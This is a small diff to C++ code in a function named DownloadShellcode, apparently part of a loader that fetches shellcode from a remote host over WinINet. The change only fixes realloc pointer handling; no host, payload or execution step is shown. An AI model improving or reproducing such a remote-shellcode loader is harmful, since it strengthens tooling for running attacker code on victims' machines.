@@ -140,7 +140,11 @@ BOOL DownloadShellcode(LPCWSTR host, INTERNET_PORT port, Shellcode* shellcode) {
 	
 	delete[] buffer;
 	
+	// Trim excess memory
 	BYTE* newPayload = (BYTE*)realloc(payload, payloadSize);
+	if (newPayload) {
+		payload = newPayload; // Update the main pointer safely
+	}
 
 	InternetCloseHandle(request);
 	InternetCloseHandle(connection);
